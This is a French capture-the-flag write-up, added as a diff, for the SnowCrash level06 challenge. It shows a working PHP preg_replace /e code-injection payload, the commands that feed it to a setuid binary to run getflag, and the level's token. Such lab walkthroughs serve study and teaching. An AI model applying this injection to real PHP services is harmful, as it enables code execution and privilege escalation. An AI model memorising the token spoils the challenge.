@@ -1,0 +1,32 @@
+#LEVEL 06
+
+Nous avons dans le fichier home un binaire level06 et un fichier level06.php.
+
+La fonction x est celle qui nous interesse.
+Elle recupere le contenu du fichier $y passe en parametre qui doit etre au format : [x allchars]
+et le change au format y("("")");
+
+le 'e' dans la regex est useless, dans les versions recente il est remplace par
+preg_replace_callback, qui remplace la string trouvee par le resultat de la
+fonction appelee.
+
+exemple: preg_replace("/k/e", "exec('echo tsu'), "kaka");
+result = tsuatsua;
+
+Nous allons donc faire executer getflag a level06 qui est setuid en lui envoyant
+un fichier avec la regex au format qu'il souhaite.
+
+level06@SnowCrash:~$ echo '[x exec(getflag)]' > /tmp/script
+level06@SnowCrash:~$ ./level06 /tmp/script
+exec(getflag)
+
+[x exec(getflag)] ne fonctionne pas, nous avons seulement l'echo du contenu
+il va falloir utiliser la syntaxe complexe de php, qui nous permettra d'envoyer
+d'executer cela.
+
+level06@SnowCrash:~$ echo '[x {${exec(getflag)}}]' > /tmp/script
+level06@SnowCrash:~$ ./level06 /tmp/script
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
+
+Next level...
